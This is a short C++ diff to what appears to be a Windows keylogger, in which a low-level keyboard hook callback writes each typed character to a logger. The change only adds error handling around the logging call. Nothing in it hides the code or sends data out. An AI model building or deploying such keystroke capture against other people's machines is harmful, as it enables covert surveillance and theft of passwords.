@@ -1,6 +1,7 @@
 #include <string>
 #include <fstream>
 #include <windows.h>
+#include <iostream>
 
 #include "key_listener_exports.h"
 #include "key_listener_internals.h"
@@ -84,6 +85,7 @@ void KeyListener::fnPressCallback (
 )
 {
     KBDLLHOOKSTRUCT *sKeyboardStruct = (KBDLLHOOKSTRUCT *) lParam;
+    eLoggerStatus log_rc = LOGGER_UNDEFINED;
     char currentChar = 0;
     BYTE lpKeyState[256] = {0};
 
@@ -96,7 +98,11 @@ void KeyListener::fnPressCallback (
                     lpKeyState,
                     (LPWORD)&currentChar,
                     0);
-            m_KeyLogger.logLine(&currentChar, 1);
+            log_rc = m_KeyLogger.logLine(&currentChar, 1);
+            if (LOGGER_SUCCESS != log_rc) {
+                cout << "Failed to log with error: " << log_rc << endl;
+                exit(log_rc);
+            }
             break;
     }
 }
